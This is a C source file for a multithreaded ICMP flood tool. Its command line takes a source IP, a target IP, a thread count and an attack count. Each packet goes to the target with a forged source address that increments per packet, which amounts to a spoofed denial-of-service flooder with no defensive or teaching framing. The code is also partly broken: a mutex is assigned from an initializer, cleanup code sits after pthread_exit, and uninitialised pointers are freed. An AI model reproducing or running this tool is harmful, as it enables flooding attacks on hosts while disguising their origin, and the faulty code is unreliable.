#include <stdlib.h>
#include <string.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <errno.h>
#include <sys/socket.h>
#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include <wait.h>
#include <pthread.h>

#include "make_ipv4.h"


int icmp_total;
int icmp_produced;
int icmp_received;
char *dest_ip;
char *src_ip;

pthread_mutex_t mutex;
pthread_cond_t cond;


void* generate_icmp_request(void *data) {
	int thread_id = *((int*) data);

	while (1) {


		int ret;
		struct icmp *p, *rp;
		struct sockaddr_in addr, from;
		struct ip *ip;
		char buffer[1024];
		socklen_t sl;
		int hlen;
		int ping_pkt_size;

		/*
		int icmp_socket;
		icmp_socket = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
		if (icmp_socket < 0) {
			perror("socket error : ");
			exit(0);
		}*/

		memset(buffer, 0x00, 1024);

		struct iphdr ipv4_h;
		ipv4_h = prepare_empty_ipv4();
		ipv4_h = ipv4_set_protocol(ipv4_h,IPPROTO_ICMP);
		ipv4_h = ipv4_set_saddr(ipv4_h,inet_addr(src_ip));
		next_ip_addr(src_ip,1);
		ipv4_h = ipv4_set_daddr(ipv4_h,inet_addr(dest_ip));

		p = (struct icmp*) buffer;
		p->icmp_type = ICMP_ECHO;
		p->icmp_code = 0;
		p->icmp_cksum = 0;
		p->icmp_id = getpid();
		p->icmp_cksum = in_cksum((u_short*) p, 1000);

		/*
		memset(&addr, 0, sizeof(0));
		addr.sin_addr.s_addr = inet_addr(dest_ip);
		addr.sin_family = AF_INET;
		*/

		void *packet = packet_assemble(ipv4_h, p, sizeof(buffer));
		ipv4_h = ipv4_add_size(ipv4_h,sizeof(buffer));

		pthread_mutex_lock(&mutex);

			if (icmp_produced >= icmp_total) {
				pthread_mutex_unlock(&mutex);
				pthread_cond_broadcast(&cond);
				return 0;
			}

		/*ret = sendto(icmp_socket, p, sizeof(*p), MSG_DONTWAIT,
				(struct sockaddr*) &addr, sizeof(addr));
		if (ret < 0) {
			perror("sendto error : ");
		} else {
			printf("Thread[%d] : sent %d to %s\n", thread_id,icmp_produced, dest_ip);
		}*/

		send_packet(ipv4_h, packet,rand()%50000 + 1000);
		free(packet);
		icmp_produced++;

		pthread_mutex_unlock(&mutex);
	}
	return 0;
}

void* receive_icmp_reply(void *data) {
	int thread_id = *((int*) data);

	while (1) {
		pthread_mutex_lock(&mutex);

		if (icmp_received >= icmp_total) {
			pthread_mutex_unlock(&mutex);
			pthread_cond_broadcast(&cond);
			return 0;
		}

		icmp_received++;

		pthread_mutex_unlock(&mutex);

	}
}

int main(int argc, char **argv) {

	src_ip = (char*)malloc(sizeof(char)*20);


	if (argc != 5) {
		fprintf(stderr, "Usage : %s [Src-IP] [Dest-IP] [# thread] [# attack] \n",
				argv[0]);
		exit(1);
	}

	strcpy(src_ip,argv[1]);

	mutex = PTHREAD_MUTEX_INITIALIZER;

	icmp_total = atoi(argv[4]);
	icmp_produced = 0;
	icmp_received = 0;

	int num_threads = atoi(argv[3]);

	dest_ip = argv[2];

	int *generate_thread_id;
	pthread_t *generate_thread;

	int *receive_thread_id;
	pthread_t *receive_thread;

	generate_thread_id = (int*) malloc(sizeof(int) * num_threads);
	generate_thread = (pthread_t*) malloc(sizeof(pthread_t) * num_threads);
	int i;

	printf("Sending %d ICMP requests to %s using %d threads\n",icmp_total,dest_ip,num_threads);
	for (i = 0; i < num_threads; i++)
		generate_thread_id[i] = i;

	for (i = 0; i < num_threads; i++)
	{
		pthread_create(&generate_thread[i], NULL, generate_icmp_request,
						(void*) &generate_thread_id[i]);
	}


	/*
	 sl = sizeof(from);
	 ret = recvfrom(icmp_socket, buffer, 1024, 0, (struct sockaddr*) &from, &sl);
	 if (ret < 0) {
	 printf("%d %d %d\n", ret, errno, EAGAIN);
	 perror("recvfrom error : ");
	 }

	 ip = (struct ip*) buffer;
	 hlen = ip->ip_hl * 4;
	 rp = (struct icmp*) (buffer + hlen);
	 printf("reply from %s, ", inet_ntoa(from.sin_addr));
	 printf("Type : %d, ", rp->icmp_type);
	 printf("Code : %d, ", rp->icmp_code);
	 printf("Seq  : %d, ", rp->icmp_seq);
	 printf("Iden : %d \n", rp->icmp_id);
	 */
	for (i = 0; i < num_threads; i++) {
		void *status;
		pthread_join(generate_thread[i], &status);
		printf("thread %d joined\n", i);
	}

	pthread_mutex_destroy(&mutex);
	pthread_exit(NULL);

	free(generate_thread_id);
	free(generate_thread);
	free(receive_thread_id);
	free(receive_thread);
	return 1;
}

